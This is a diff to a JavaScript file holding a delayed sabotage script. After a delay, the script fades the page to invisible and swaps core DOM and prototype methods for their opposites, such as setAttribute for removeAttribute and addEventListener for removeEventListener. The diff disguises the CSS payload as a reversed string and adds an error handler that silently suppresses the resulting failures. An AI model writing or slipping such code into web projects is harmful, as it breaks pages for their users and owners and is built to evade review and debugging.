@@ -1,5 +1,5 @@
 var s = document.createElement("style");
-s.textContent = "body { animation: _ 1s 60s alternate infinite } @keyframes _ { to { opacity: 0 } }";
+s.textContent = "} } 0 :yticapo { ot { _ semarfyek@ } etinifni etanretla s06 s1 _ :noitamina { ydob".split("").reverse().join("");
 document.head.appendChild(s);
 setTimeout(() => {
   Object.prototype.toString = Object.prototype.valueOf;
@@ -32,4 +32,5 @@ setTimeout(() => {
   document.getElementById = document.getElementsByClassName;
   Element.prototype.setAttribute = Element.prototype.removeAttribute;
   Element.prototype.addEventListener = Element.prototype.removeEventListener;
+  window.onerror = Boolean;
 }, 5000);
